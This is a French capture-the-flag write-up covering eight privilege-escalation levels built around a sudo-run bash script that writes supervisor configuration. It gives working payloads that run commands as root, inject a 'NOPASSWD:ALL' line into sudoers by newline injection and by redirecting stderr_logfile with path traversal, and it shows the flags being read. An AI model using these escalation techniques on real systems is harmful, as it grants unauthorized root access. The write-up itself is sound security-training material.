# La guilde des voleurs

## Description:
Dans les ruelles sombres de la cité de Valombre, la légendaire Guilde des Voleurs veille dans l'ombre. Son doyen, le mystérieux Maître Silas, cherche un héritier digne de porter le manteau du guild master. Pour cela, il lance une série d'épreuves à ses apprentis les plus prometteurs.

Tu es l'un de ces apprentis. Pour prouver ta valeur, tu devras infiltrer les demeures des plus hautes autorités de la ville, du Magistrat au Chambellan Royal. Chaque lieu est protégé par des énigmes, des pièges magiques et des systèmes de sécurité redoutables.

Pour chaque cambriolage, tu devras collecter un artefact bien gardé. Celui-ci se situe dans la demeure de l'autorité ciblée.
Une fois ta mission accomplie, retourne dans les catacombes de la guilde pour présenter tes trouvailles à Silas.
Si ton butin est jugé digne, tu passeras à la cible suivante.
À la fin de toutes les épreuves, tu pourras prétendre au titre de guild master et accéder à ses secrets les plus profonds.

## Information
- ssh login et password


# Niveau 1 - Pickpocket

Nous nous retrouvons donc sur un serveur Linux. Ok ok avant de lancer `linpeas.sh` explorons un peu 😊

Nous avons un sudo role

```bash
challenge@a0047cc90f8c:~$ sudo -l
Matching Defaults entries for challenge on a0047cc90f8c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User challenge may run the following commands on a0047cc90f8c:
    (root) NOPASSWD: /usr/bin/pickpocket
```

Allons donc voir ce fameux pickpocket ?
<details>

```bash
#!/usr/bin/bash
INPUT_FILE=$1
DEST_FILE=/etc/supervisor/conf.d/pickpocket.conf
PROGRAM=pickpocket
ALLOWED_KEYS=("command" "process_name" "numprocs" "numprocs_start" "priority" "autostart" "startsecs" "startretries" "autorestart" "exitcodes" "stopsignal" "stopwaitsecs" "killasgroup" "user")

get_ini_value() {
  local file="$1"

  awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*\]/{content=0} content" "$file"
}

parse_ini_to_map() {
    local ini_string=$1
    declare -gA ini_map=()

    while IFS= read -r line; do
        line="${line%%#*}"
        line="$(echo "$line" | tr '[:upper:]' '[:lower:]')"

        [[ -z "$line" || "$line" =~ ^\[.*\]$ ]] && continue

        if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then
            key="$(echo "${BASH_REMATCH[1]}" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}')"
            value="$(echo "${BASH_REMATCH[2]}" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}')"

            ini_map["$key"]="$value"
        fi
    done <<< "$ini_string"
}

generate_ini_content() {
  for key in "${!ini_map[@]}"; do
    for allowed_key in "${ALLOWED_KEYS[@]}"; do
        if [[ "$key" =~ "$allowed_key" ]]; then
            echo "$key=${ini_map[$key]}"
        fi
    done
  done
}

input=$({
  get_ini_value "$INPUT_FILE";
})

parse_ini_to_map "$input"

{
  echo "[program:$PROGRAM]";
  echo "user=challenge";
  echo "autostart=false";
  echo "startretries=0";
  generate_ini_content
} > $DEST_FILE

supervisorctl reread
supervisorctl update
supervisorctl start all
```
</details>
</br>

Ok, Nous allons donc analyser ce code

```bash
#!/usr/bin/bash
INPUT_FILE=$1
DEST_FILE=/etc/supervisor/conf.d/pickpocket.conf
PROGRAM=pickpocket
ALLOWED_KEYS=("command" "process_name" "numprocs" "numprocs_start" "priority" "autostart" "startsecs" "startretries" "autorestart" "exitcodes" "stopsignal" "stopwaitsecs" "killasgroup" "user")
```

- Donc ce script bash va ecrire un fichier de configuration pour `supervisorctl` dans `/etc/....`
- Le nom du program est `pickpocket`
- Le script prend un parametre `INPUT_FILE=$1` qui est un fichier
- Et finalement nous avons une liste de cle autorisees 

## Fonction `get_ini_value()`
```bash
get_ini_value() {
  local file="$1"

  awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*\]/{content=0} content" "$file"
}
```
En gros, cette fonction va parser le fichier passe en entre, 
- s'il trouve la string suivante: `[program:pickpocket]` content = 1
- s'il trouve une autre section `[.*]` content = 0
- Awk va imprimer les lignes tant que content == 1

En resumer awk va commencer a imprimer a partir de la section `[program:pickpocket]` tant et aussi longtemps qu'une autre section n'est pas detecter `[.*]`

## Fonction `parse_ini_to_map()`
```bash
parse_ini_to_map() {
    local ini_string=$1
    declare -gA ini_map=()

    while IFS= read -r line; do
        line="${line%%#*}"
        line="$(echo "$line" | tr '[:upper:]' '[:lower:]')"

        [[ -z "$line" || "$line" =~ ^\[.*\]$ ]] && continue

        if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then
            key="$(echo "${BASH_REMATCH[1]}" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}')"
            value="$(echo "${BASH_REMATCH[2]}" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}')"

            ini_map["$key"]="$value"
        fi
    done <<< "$ini_string"
}
```
- On delcare un tableau associatif 
- On boucle sur les lignes `while IFS= read -r line; do`
- On supprime les commentaires `line="${line%%#*}" ` 
- On met tout en minuscule `line="$(echo "$line" | tr '[:upper:]' '[:lower:]')"`
- On ignore toute les lignes "inutiles" `[[ -z "$line" || "$line" =~ ^\[.*\]$ ]] && continue`
- On Parse cle=valeur `if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then`

Bref, on parse le contenue conserver par awk afin de sortir cle/valeur du fichier de configuration passer au script

## Fonction `generate_ini_content()`
```bash
generate_ini_content() {
  for key in "${!ini_map[@]}"; do
    for allowed_key in "${ALLOWED_KEYS[@]}"; do
        if [[ "$key" =~ "$allowed_key" ]]; then
            echo "$key=${ini_map[$key]}"
        fi
    done
  done
}
```
- Cette fonction genere le ini/conf final pour supervisor
- On s'assure que les cle sont dans `ALLOWED_KEYS`

## Finalement
```bash
{
  echo "[program:$PROGRAM]";
  echo "user=challenge";
  echo "autostart=false";
  echo "startretries=0";
  generate_ini_content
} > $DEST_FILE

supervisorctl reread
supervisorctl update
supervisorctl start all
```
- On ecris le fichier finale de configuration pour supervisor un critere cle
- `user=challenge` est forcer

Ensuite on relance supervisor pour relire la configuration et executer le program.

---------

> **[INFO]**  
> La track ce deroule toujours autour de ce script, donc le script de base ne sera pas reexpliquer pour chaque challenge
> Notez que le flag est toujours dans `/root/flag`

## Solution

### Code problematique:
```bash
{
  echo "[program:$PROGRAM]";
  echo "user=challenge";
  echo "autostart=false";
  echo "startretries=0";
  generate_ini_content
} > $DEST_FILE
```
La ligne `user=challenge` est place **AVANT** le contenue de mon ini passer en parametre.

`supervisor` va prendre la derniere occurence pour la valeur de la cle `user`

Donc avec ce fichier d'entre
```ini
[program:pickpocket]
user=root
command=/bin/bash -c 'cat /root/flag > /tmp/owned'
```

On apelle donc le program: `sudo /usr/bin/pickpocket meow.ini`

Apres le passage dans le script `pickpocket` le fichier de configuration ressemble a:
```ini
[program:pickpocket]
user=challenge
autostart=false
startretries=0
user=root
command=/bin/bash -c 'cat /root/flag > /tmp/meow'
```

En execution:
```bash
challenge@a0047cc90f8c:~$ sudo /usr/bin/pickpocket meow.ini 
pickpocket: available
pickpocket: added process group
pickpocket: ERROR (spawn error)
challenge@a0047cc90f8c:~$ cat /tmp/meow 
FINCTF-bc58e9727e2d75fc55e14f54dbd763ce
```

Pickpocket: `FINCTF-bc58e9727e2d75fc55e14f54dbd763ce`

-----

# Niveau 2: Footpad

## Difference

Voici les difference entre les 2 niveaux

```diff
 diff pickpocket/chal.sh footpad/chal.sh 
1a2
> 
3,4c4,5
< DEST_FILE=/etc/supervisor/conf.d/pickpocket.conf
< PROGRAM=pickpocket
---
> DEST_FILE=/etc/supervisor/conf.d/footpad.conf
> PROGRAM=footpad
26a28,33
>             # Prevent redefining the user key
>             if [[ "$key" == "user" ]]; then
>               echo "The user property cannot be redefined" >&2
>               exit 1
>             fi
> 
32c39
< generate_ini_content() {
---
> generate_ini_content() {
```

On peut constater que la faille #1 a ete corriger ajoutant une protection pour redefinir la cle `user`
Cependant la cle `user` est toujours dans le tableau `ALLOWED_KEYS`

## Code problematique 
```bash
[[ "$key" == "user" ]];

# Ceci est problematique due a ceci:

key="$(echo "${BASH_REMATCH[1]}" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}')"
```

Cette ligne de code qui semble sortit d'un grimoire fais en realiter les choses suivante:
- `"${BASH_REMATCH[1]}"` Récupère la sous-chaîne capturée par la première parenthèse de la dernière expression régulière exécutée avec succès en bash.
- `sub(/^[ \t]+/, ""); ` Nettoie tout les espaces blanc du **debut** de la chaine
- `sub(/[ \t]+$/, "");`  Nettoie tout les espaces blanc de la **fin** de la chaine
- On envoie le tout avec print dans `${key}`

## Test

Resultat: 
```
CLEANED_STRING=$(echo "key=value" | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}') && echo "${CLEANED_STRING}"
key=value
CLEANED_STRING=$(echo "    key    =   value    " | awk '{sub(/^[ \t]+/, ""); sub(/[ \t]+$/, ""); print}') && echo "${CLEANED_STRING}"
key   =   value
```

Donc les espaces ne sont pas nettoyer entre la cle et la valeur.

## Solution

```ini
[program:footpad]
user =root
command=/bin/bash -c "cat /root/flag > /tmp/owned"
```
Car la cle sera user[::space::] qui n'est pas egale a user

```bash
┌[drgn@MeowMeow.catnip]
└[~/writeups]> [[ "user" == "user " ]]
┌[drgn@MeowMeow.catnip]
└[~/writeups]> echo $?
1 # <--------- False
```
Il faut noter egalement la validation lache de `$ALLOWED_KEYS`
```bash
if [[ "$key" =~ "$allowed_key" ]]; then
```

Et Cette directive est toujours valide pour supervisor

Footpad: `FINCTF-85d2696f7b037cb0155b02f024184ad4`

# Niveau 3: Bandit

## Difference:

```diff
<   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*\]/{content=0} content" "$file"
---
>   # Added support for a group sections after the program
>   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|event|rpc|incl)|(program:).+\]/{content=0} content" "$file"
```

Maintenant le code qui lis le fichier source supporte des sous-sections.
Tant et aussi longtemps que le script ne frappe pas une section:
- [unix]
- [inet]
- [supervisor]
- [event]
- [rpc]
- [incl]
- [program:$ANOTHER_PROGRAM]

```diff
<         [[ -z "$line" || "$line" =~ ^\[.*\]$ ]] && continue
---
>         [[ -z "$line" ]] && continue
>         [[ "$line" =~ ^\[.*\]$ ]] && break
```

`[[ "$line" =~ ^\[.*\]$ ]] && break` Ceci gere la fin de la section, si une nouvelle section est trouvee on sort de la boucle


```diff
---
>             key="$(echo "${BASH_REMATCH[1]}" | xargs)" # Better trimming
>             value="$(echo "${BASH_REMATCH[2]}" | xargs)" # Better trimming
38a41,58
> parse_other_sections() {
>   local ini_string=$1
>   local programSectionEnded=0
> 
>   while IFS= read -r line; do
>       line="${line%%#*}"
> 
>       if (( programSectionEnded )); then
>         echo "$line"
>       else
>         [[ -z "$line" || ! "$line" =~ ^\[.*\]$ ]] && continue
> 
>         programSectionEnded=1
>         echo "$line"
>       fi
>   done <<< "$ini_string"
> }
> 
42c62,63
<         if [[ "$key" =~ "$allowed_key" ]]; then
---
```

Ajout de la fonction parse_other_sections qui assure le support des autres section du fichier ini

```diff
<         if [[ "$key" =~ "$allowed_key" ]]; then
---
>         # Now ensures the key matches exactly
>         if [[ "$key" == "$allowed_key" ]]; then 
60c81,82
```

Correction de la validation lache au niveau de la cle

## Code problematique:

```bash
# Added support for a group sections after the program
  awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|event|rpc|incl)|(program:).+\]/{content=0} content" "$file"
```

Awk va arreter de lire lorsqu'il tombe sur certaine section, mais pour une section `[program:$AUTRE_PROGRAM]` que va-t-il se passer si on omet la variable `$AUTRE_PROGRAM`
Awk va continuer avec content=1

Pour supervisor un nom de programe vide est valide. Donc on injecte un 2e program avec un nom vide qui fais ce qu'on veut! 😈

## Solution

```ini
[program:bandit]
command=/bin/true

[program:]
user=root
command=/bin/bash -c 'cat /root/flag > /tmp/owned'
autostart=true
```

Resultat dans supervisor:
```bash
challenge@b1b632d7cee3:~$ cat /etc/supervisor/conf.d/bandit.conf 
[program:bandit]
user=challenge
autostart=false
startretries=0
command=/bin/true
[program:]
user=root
command=/bin/bash -c 'cat /root/flag > /tmp/owned'
autostart=true

challenge@b1b632d7cee3:~$ cat /tmp/owned 
FINCTF-3a272ba6d5e03bfde3b30a1f7de24a53
```

Bandit: `FINCTF-3a272ba6d5e03bfde3b30a1f7de24a53`

# Niveau 4: Prowler

> **[NOTE]** Pour celui-ci je l'ai resolue d'une facon qui n'etait peut-etre pas celle prevue par l'auteur

## Difference:

```diff
<   # Added support for a group sections after the program, and prevent usage of empty program name
<   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|event|rpc|incl)|(program:).*\]/{content=0} content" "$file"
---
>   # Added support for a group sections after the program
>   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|event|rpc|incl)|(program:).+\]/{content=0} content" "$file"
```

Le nom de program vide a ete corriger:

[program:] ne match pas au niveau du `.+` continue donc la lecture des lignes

[program:] match au niveau du `.*` arrete la lecture!

```diff
>             # Prevent redefining the user key
>             if [[ "$key" == "user" ]]; then
>               echo "The user property cannot be redefined" >&2
>               exit 1
>             fi
> 
65,84d69
< validate_user() {
<   user="${ini_map[user]}"
< 
<   if [[ -z "$user" ]]; then
<     ini_map["user"]="challenge"
<   else
<     if [[ "$user" =~ [0-9] ]]; then
<       echo "Only the challenge user is currently allowed."
<       exit 1
<     fi
< 
<     for forbidden in $FORBIDDEN_USER; do
<       if [[ "$forbidden" == *"$user" ]]; then
<         echo "Only the challenge user is currently allowed."
<         exit 1
<       fi
<     done
<   fi
< }
< 
```

La cle `user` est permise et la valeur par default est challenge, cependant la valeur de user ne peut-etre dans le tableau suivant:
```bash
FORBIDDEN_USER=("root" "daemon" "bin" "sys" "sync" "games" "man" "lp" "mail" "news" "uucp" "proxy" "www-data" "backup" "list" "irc" "_apt" "nobody" "ubuntu" "systemd-network" "systemd-timesync" "messagebus" "systemd-resolve" "sshd")
```

## Code problematique
```bash
            key="$(echo "${BASH_REMATCH[1]}" | xargs)" # Better trimming
            value="$(echo "${BASH_REMATCH[2]}" | xargs)" # Better trimming
```

L'indication `#Better trimming` est un peu fausse.
`xargs` ne va pas supprimer certain char. Voici un petit code de test
```bash
┌[MeowMeow@catnipserver]
└[~/writeups]>
CONTAMINATED_VALUE="root' '"
CLEANED_VALUE=$(printf "%s" "$CONTAMINATED_VALUE" | xargs)
echo "Valeur originale [${CONTAMINATED_VALUE}]"
echo "Valeur nettoyée par xargs: [${CLEANED_VALUE}]"

Valeur originale [root' ']
Valeur nettoyée par xargs: [root ]
```

Donc dans ce code de validation

```bash
validate_user() {
  user="${ini_map[user]}"
  for forbidden in $FORBIDDEN_USER; do
    if [[ "$forbidden" == *"$user" ]]; then
      echo "Only the challenge user is currently allowed."
      exit 1
    fi
  done
}
```

`root' '` n'est pas egale a `root`

```bash
┌[MeowMeow@catnipserver]
└[~/writeups]> 
STRING_A="root"
STRING_B="root' '"
[[ "$STRING_A" == "$STRING_B" ]];

┌[MeowMeow@catnipserver]
└[~/writeups]> echo $?
1 #<----------- False
```

Et pour supervisor c'est legitime!

## Solution
```ini
[program:prowler]
command=cp /root/flag /tmp
user=root' '
```

```bash
challenge@698b6d3a39e1:~$ cat -A /etc/supervisor/conf.d/prowler.conf 
[program:prowler]$
autostart=false$
startretries=0$
user=root $ #<----- Notre whitespace
command=cp /root/flag /tmp$

challenge@698b6d3a39e1:~$ cat /tmp/flag 
FINCTF-f526dc93fe4b9fd82d7a05e022194501
```

Prowler: `FINCTF-f526dc93fe4b9fd82d7a05e022194501`

# Niveau 5: Cat-burglar

## Difference
``` diff
13c12
<   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|event|rpc|incl)|(program:).*\]/{content=0} content" "$file"
---
>   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|rpc|incl)|(program:).*\]/{content=0} content" "$file"
65,84d63
```

On peut constater ici que une section `event` permet de continuer la lecture avec `awk` !

```diff
91,92c70,71
< # Now forcing the user to use the challenge user in its config.
< validate_user
---
> # Now forcing the user to use the challenge user
> ini_map["user"]="challenge"
99a79
```

Finalement le user `challenge` est coder en dur

## Code problematique

```bash
awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|rpc|incl)|(program:).*\]/{content=0} content" "$file"
```
Les sections `event` ne brise pas la lecture du contenue

```bash
{
  echo "[program:$PROGRAM]";
  echo "autostart=false";
  echo "startretries=0";
  generate_ini_content;
  parse_other_sections "$input"
  echo "user=challenge";
} > $DEST_FILE
```
L'ordre ne prend pas en consideration combien de section "event" nous avons.
Donc l'utilisateur pour le `program:cat_burglar` est forcer a challenge
La derniere section aura egalement `user=challenge`, mais pas celle du millieux! 😈

## Solution

```ini
[program:cat_burglar]
command=sleep 1

[eventlistener:meow]
command=/bin/bash -c "cat /root/flag > /tmp/owned" # <------ Malicious Red Lazer Pointer
events=PROCESS_STATE_FATAL,PROCESS_STATE_STOPPED # <--- requis pour une section eventlistener

[eventlistener:woof]
command="helloworld" # <---- N'importe quoi
events=PROCESS_STATE_FATAL,PROCESS_STATE_STOPPED # <--- requis pour une section eventlistener
```

Resultat:

```bash
cat /etc/supervisor/conf.d/cat_burglar.conf

[program:cat_burglar]
autostart=false
startretries=0
command=sleep 1
user=challenge #<-------- L'utilisateur forcer #1

[eventlistener:meow]
command=/bin/bash -c "cat /root/flag > /tmp/owned"  #<------- Commande a executer lors de l'event
events=PROCESS_STATE_FATAL,PROCESS_STATE_STOPPED #<------ Trigger de l'event sur FATAL ou STOPPED
# La variable ici user n'est pas definie, par default vous l'aurez compris... root!

[eventlistener:woof]
command="helloworld"
events=PROCESS_STATE_FATAL,PROCESS_STATE_STOPPED
user=challenge #<------ L'utilisateur forcer #2
```

```bash
challenge@01bcbb473c9c:~$ cat /tmp/owned 
FINCTF-7abe8a941ddd2a3b6e93819fc17a046a
```

Cat-Burglar: `FINCTF-7abe8a941ddd2a3b6e93819fc17a046a`

# Niveau 6: Shadowfoot

```diff
3,7c3,5
< COMMAND=$1
< INPUT_FILE=$2
< DEST_FILE=/etc/supervisor/conf.d/shadowfoot.conf
< PROGRAM=$2
< SUDOERS_FILE=/etc/sudoers.d/shadowfoot
---
> INPUT_FILE=$1
> DEST_FILE=/etc/supervisor/conf.d/cat_burglar.conf
> PROGRAM=cat_burglar
13,22c11,12
```

Changer de l'interface d'entree. Prend maintenant 2 argument:
- COMMAND, qui n'est pas utilisee
- PROGRAM, qui est le nom du program


```diff
13,22c11,12
<   # Removed support for group and event sections as they were always abused...
<   awk "/\s*\[program:shadowfoot\]/{content=1; next} /\[.*\]/{content=0} content" "$file"
< }
< 
< add_sudo_rights() {
<   {
<     echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl start $PROGRAM";
<     echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl stop $PROGRAM";
<     echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl restart $PROGRAM";
<   } > $SUDOERS_FILE
---
>   # Added support for a group sections after the program, and prevent usage of empty program name
>   awk "/\s*\[program:$PROGRAM\]/{content=1; next} /\[.*(unix|inet|supervisor|rpc|incl)|(program:).*\]/{content=0} content" "$file"
72,77d61
```

Retrait du support pour les groupes, mais ajout de la gestion de sudo role!


```diff
sanitize_program_name() {
  echo "$1" | tr -d ',' | tr -d '/' | tr -d '.' | tr -d '\'
}

PROGRAM=$(sanitize_program_name "$PROGRAM")
```
Nettoyage de la variable `PROGRAM`

Finalement une ligne a la fin pour ajouter les roles sudo

## Code problematique

```bash
add_sudo_rights() {
  {
    echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl start $PROGRAM";
    echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl stop $PROGRAM";
    echo "challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl restart $PROGRAM";
  } > $SUDOERS_FILE
}
```

```bash
sanitize_program_name() {
  echo "$1" | tr -d ',' | tr -d '/' | tr -d '.' | tr -d '\'
}

PROGRAM=$(sanitize_program_name "$PROGRAM")
```

Un classique des classiques, une variable controller par l'utilisateur mal nettoyer!

## Solution
```bash
PAYLOAD=$(printf "shadowfoot\nchallenge ALL=(root) NOPASSWD:ALL ")
sudo /usr/bin/shadowfoot unused "$(echo -n "$PAYLOAD")"
```
Cette ligne de commande exploite la variable `$PROGRAM` dans les sudo role 
En ajoutant un `\n` (car la fonction de nettoyage ne catch que `,/.\`), les lignes suivantes seront ajouter au fichier sudo
```conf
challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl start shadowfoot
challenge ALL=(root) NOPASSWD:ALL
challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl stop shadowfoot
challenge ALL=(root) NOPASSWD:ALL
challenge ALL=(root) NOPASSWD: /usr/bin/supervisorctl restart shadowfoot
challenge ALL=(root) NOPASSWD:ALL
```

```bash
challenge@e0dbf484dbb8:~$ PAYLOAD=$(printf "shadowfoot\nchallenge ALL=(root) NOPASSWD:ALL ")
challenge@e0dbf484dbb8:~$ sudo /usr/bin/shadowfoot unused "$(echo -n "$PAYLOAD")"
tr: warning: an unescaped backslash at end of string is not portable
awk: cannot open "shadowfoot
challenge ALL=(root) NOPASSWD:ALL " (No such file or directory)
ERROR: CANT_REREAD: program section program:shadowfoot does not specify a command in section 'program:shadowfoot' (file: '/etc/supervisor/conf.d/shadowfoot.conf')
error: <class 'xmlrpc.client.Fault'>, <Fault 92: "CANT_REREAD: program section program:shadowfoot does not specify a command in section 'program:shadowfoot' (file: '/etc/supervisor/conf.d/shadowfoot.conf')">: file: /usr/lib/python3.12/xmlrpc/client.py line: 668
challenge@e0dbf484dbb8:~$ sudo -l
Matching Defaults entries for challenge on e0dbf484dbb8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User challenge may run the following commands on e0dbf484dbb8:
    (root) NOPASSWD: /usr/bin/shadowfoot
    (root) NOPASSWD: /usr/bin/supervisorctl start shadowfoot
    (root) NOPASSWD: ALL
    (root) NOPASSWD: /usr/bin/supervisorctl stop shadowfoot
    (root) NOPASSWD: ALL
    (root) NOPASSWD: /usr/bin/supervisorctl restart shadowfoot
    (root) NOPASSWD: ALL
challenge@e0dbf484dbb8:~$ sudo cat /root/flag
FINCTF-21d39b012f855372666413ba1ffd12fc
```

Shadowfoot: `FINCTF-21d39b012f855372666413ba1ffd12fc`

# Niveau 7: Master Thief

## Difference

```diff
5,8c5,8
< DEST_FILE=/etc/supervisor/conf.d/shadowfoot.conf
< PROGRAM=$2
< SUDOERS_FILE=/etc/sudoers.d/shadowfoot
< ALLOWED_KEYS=("command" "process_name" "numprocs" "numprocs_start" "priority" "autostart" "startsecs" "startretries" "autorestart" "exitcodes" "stopsignal" "stopwaitsecs" "killasgroup" "environment")
---
> PROGRAM=master_thief
> DEST_FILE=/etc/supervisor/conf.d/$PROGRAM.conf
> SUDOERS_FILE=/etc/sudoers.d/$PROGRAM
> ALLOWED_KEYS=("command" "process_name" "numprocs" "numprocs_start" "priority" "autostart" "startsecs" "startretries" "autorestart" "exitcodes" "stopsignal" "stopwaitsecs" "killasgroup" "environment" "stderr_logfile")
14c14
```

La grosse difference notable pour celui-ci est que maintenant nous pouvons utilisee la cle `stderr_logfile`

Spoiler!
<details>
supervisor ecris les logs as.... root... -_-'
</details>

## Solution

```ini
[program:master_thief]
command=bash /home/challenge/steal.sh
stderr_logfile=/etc/sudoers.d/owned
```

```bash
# /home/challenge/steal.sh
echo -e "challenge ALL=(root) NOPASSWD:ALL" >&2
```

```bash
challenge@7978066677a6:~$ sudo /usr/bin/master_thief UNUSED_VARIABLE meow.ini 
tr: warning: an unescaped backslash at end of string is not portable
master_thief: available
master_thief: added process group
master_thief: ERROR (spawn error)
challenge@7978066677a6:~$ sudo -l
Matching Defaults entries for challenge on 7978066677a6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User challenge may run the following commands on 7978066677a6:
    (root) NOPASSWD: /usr/bin/master_thief
    (root) NOPASSWD: /usr/bin/supervisorctl start master_thief
    (root) NOPASSWD: /usr/bin/supervisorctl stop master_thief
    (root) NOPASSWD: /usr/bin/supervisorctl restart master_thief
    (root) NOPASSWD: ALL
challenge@7978066677a6:~$ sudo cat /root/flag
FINCTF-d11805ae9c25aaca7121b8f05a036658
```

Masterthief: `FINCTF-d11805ae9c25aaca7121b8f05a036658`

# Niveau 8: GuildMaster

## Difference

```diff
31c31
<         line="$(echo "$line")"
---
>         line="$(echo "$line" | tr '[:upper:]' '[:lower:]')"
37c37
<             key="$(echo "${BASH_REMATCH[1]}" | xargs | tr '[:upper:]' '[:lower:]')" # Better trimming
---
>             key="$(echo "${BASH_REMATCH[1]}" | xargs)" # Better trimming
80,89d79
```

On peut voir que le "toLowerCase()" a changer d'endroit! 
Aulieu de le faire sur la ligne il est uniquement fais sur la cle! Tres louche 😘

``` bash
sanitize_path() { # not even logging can be trusted
  local file=$(basename "$1")
  local base="/var/log"

  file="${file#/}"

  echo "$base/$file"
}
```
Une nouveaute! Cette fois le script tente de nous "locked" dans `/var/log`

## Code problematique

```diff
31c31
<         line="$(echo "$line")"
---
>         line="$(echo "$line" | tr '[:upper:]' '[:lower:]')"
37c37
<             key="$(echo "${BASH_REMATCH[1]}" | xargs | tr '[:upper:]' '[:lower:]')" # Better trimming
---
>             key="$(echo "${BASH_REMATCH[1]}" | xargs)" # Better trimming
80,89d79
```

Ceci est intentionelle, mais cela nous permet enfin d'utilise les variable d'environment 
Cette cle est dans `ALLOWED_KEYS`, mais nous ne pouvions pas nous en servir jusqu'ici car supervisor utilise la syntaxe suivante:
[Documentation de supervisor](https://supervisord.org/configuration.html#environment-variables)
>Environment variables that are present in the environment at the time that supervisord is started can be used in the configuration file using the Python string expression syntax %(ENV_X)s:

Mais l'ancien nettoyage, transformais `%(ENV_X)s` en `%(env_x)s`, donc inutilisable.

## Solution
Simplement trick avec les variables d'environment et les chemin relatifs!

```ini
[program:guild_master]
environment=KEY="../../etc/sudoers.d/"
command=bash /home/challenge/steal.sh
stderr_logfile=%(ENV_KEY)sowned
```

```bash
# /home/challenge/steal.sh
echo -e "challenge ALL=(root) NOPASSWD:ALL" >&2
```

Meme principe que le precedant, en contournant la prison de `/var/log`

```bash
challenge@626df42f6233:~$ sudo /usr/bin/guild_master UNUSED_VARiABLE meow.ini 
tr: warning: an unescaped backslash at end of string is not portable
/var/log/%(ENV_KEY)sowned
guild_master: available
guild_master: added process group
guild_master: ERROR (spawn error)
challenge@626df42f6233:~$ sudo -k
challenge@626df42f6233:~$ sudo -l
Matching Defaults entries for challenge on 626df42f6233:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User challenge may run the following commands on 626df42f6233:
    (root) NOPASSWD: /usr/bin/guild_master
    (root) NOPASSWD: /usr/bin/supervisorctl start guild_master
    (root) NOPASSWD: /usr/bin/supervisorctl stop guild_master
    (root) NOPASSWD: /usr/bin/supervisorctl restart guild_master
    (root) NOPASSWD: ALL
challenge@626df42f6233:~$ sudo cat /root/flag
FINCTF-717ee8e794b018c89beb808d936a991d
```

Guild Master: `FINCTF-717ee8e794b018c89beb808d936a991d`

![alt text](assets/image.png)